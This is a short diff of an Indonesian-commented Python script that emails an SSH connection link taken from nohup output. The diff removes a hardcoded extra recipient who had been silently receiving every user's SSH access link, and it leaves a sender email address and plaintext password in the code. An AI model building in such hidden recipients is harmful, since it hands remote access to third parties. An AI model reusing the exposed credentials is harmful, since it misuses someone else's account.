@@ -95,11 +95,10 @@ def send_email(sender_email, sender_password, recipient_emails, subject, body):
     except Exception as e:
         pass
 
-
 if __name__ == "__main__":
     # Parsing argumen baris perintah
     parser = argparse.ArgumentParser(description="Kirim email dengan output dari skrip ini.")
-    parser.add_argument("-email", "--email", help="Tambahkan alamat email penerima tambahan", required=True)
+    parser.add_argument("-email", "--email", help="Tambahkan alamat email penerima", required=True)
     args = parser.parse_args()
 
     try:
@@ -119,7 +118,7 @@ if __name__ == "__main__":
         # Kirim email dengan output sebagai body
         sender_email = "wesleyarmstrong2020@unlock.web.id"
         sender_password = "afgjkizfczkcblno"
-        recipient_emails = ["icadnewton@gmail.com", args.email]  # Tambahkan email dari argumen
+        recipient_emails = [args.email]  # Hanya gunakan email dari argumen
         subject = "Nohup Output"
         body = f"Koneksi SSH Anda: {https_link}"
 
